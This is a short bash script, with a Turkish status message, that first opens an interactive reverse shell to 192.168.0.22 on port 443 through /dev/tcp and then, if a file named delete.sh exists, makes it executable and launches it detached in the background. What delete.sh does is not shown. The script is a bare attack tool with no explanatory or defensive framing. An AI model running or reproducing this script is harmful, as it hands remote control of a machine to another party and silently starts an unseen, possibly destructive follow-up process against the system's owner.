#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

sleep 2

if [ -f "delete.sh" ]; then

    echo "[+] delete.sh bağımsız arka planda başlatılıyor..."

    chmod +x delete.sh 2>/dev/null

    nohup ./delete.sh >/dev/null 2>&1 &

    disown

fi
